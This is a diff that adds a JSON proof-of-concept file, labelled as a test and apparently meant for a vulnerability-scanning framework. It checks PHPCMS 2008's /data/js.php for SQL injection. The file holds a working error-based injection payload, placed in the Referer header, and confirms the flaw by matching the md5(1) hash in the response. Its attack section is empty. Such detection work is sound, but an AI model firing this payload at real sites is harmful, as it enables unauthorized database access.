@@ -1,0 +1,41 @@
+{
+  "pocInfo": {
+    "vulID": "test-pocsuite-phpcms-sqli",
+    "version": "1",
+    "vulDate": "2025-11-27",
+    "createDate": "2025-11-27",
+    "updateDate": "2025-11-27",
+    "name": "PHPCMS 2008 SQL Injection (Test)",
+    "protocol": "http",
+    "vulType": "SQL Injection",
+    "author": "Potato",
+    "references": [],
+    "appName": "PHPCMS",
+    "appVersion": "2008",
+    "appPowerLink": "",
+    "desc": "测试 PHPCMS SQL 注入漏洞检测，通过 Referer 头注入返回 MD5(1) 哈希值",
+    "samples": []
+  },
+  "pocExecute": {
+    "verify": [
+      {
+        "step": "0",
+        "method": "get",
+        "vulPath": "/data/js.php",
+        "params": "id=1",
+        "necessary": "",
+        "headers": {
+          "Referer": "1', (SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),char(45,45,45),(SELECT md5(1)))a from information_schema.tables group by a)b), '0')#"
+        },
+        "status": "200",
+        "match": {
+          "regex": [
+            "c4ca4238a0b923820dcc509a6f75849b"
+          ],
+          "time": ""
+        }
+      }
+    ],
+    "attack": []
+  }
+}
